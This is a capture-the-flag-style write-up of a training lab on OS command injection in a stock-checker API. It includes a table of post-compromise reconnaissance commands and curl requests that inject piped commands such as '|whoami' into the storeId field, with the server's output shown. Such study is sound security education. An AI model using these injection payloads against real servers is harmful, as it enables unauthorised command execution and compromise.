# OS command injection

OS command injection (also known as shell injection), allows an attacker to execute OS commands on a server. This typically leads to a full compromise of the server (and the application + data). If other systems are present in the network, OS command injection typically allows the attacker to furhter their campaign by compromising other parts of an organization / application infrastructure.

Some useful commands for Linux and Windows OS when OS inejction is found:

| Purpose of command | Linux | Windows |
| ----------- | ----------- |  ----------- |
| Name of current user | `whoami` | `whoami` |
| Operating system (and version) | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connectios | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |

## Lab: OS command injection, simple case

**Lab Description**:  This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. To solve the lab, execute the whoami command to determine the name of the current user.

### Lab solution

The store queries a backend API for the stock data with the following link: `https://0ada005a030ef15f81ac7f0f00e000b3.web-security-academy.net/product/stock`. Furthermore, the request is sent as a POST request with the body containing: `productId=1&storeId=1`. Depending on how the data in the body is processed, we are able to inject OS commands, as described in the lab description. To verify, we perform a query with curl, to the URL with the echo command. The payload will be the following:

```bash
curl -X POST -d "productId=1&storeId=1|echo 'hej'" https://0ada005a030ef15f81ac7f0f00e000b3.web-security-academy.net/product/stock
hej
```

After trying different input, the API will return an error, if either product ID or store ID is not present. Therefore the echo command needs to be piped in order to execute. The following command will send the `whoami` command to the server and solve the lab:

```bash
curl -X POST -d "productId=1&storeId=1|whoami" https://0ada005a030ef15f81ac7f0f00e000b3.web-security-academy.net/product/stock
peter-BiwxkE
```
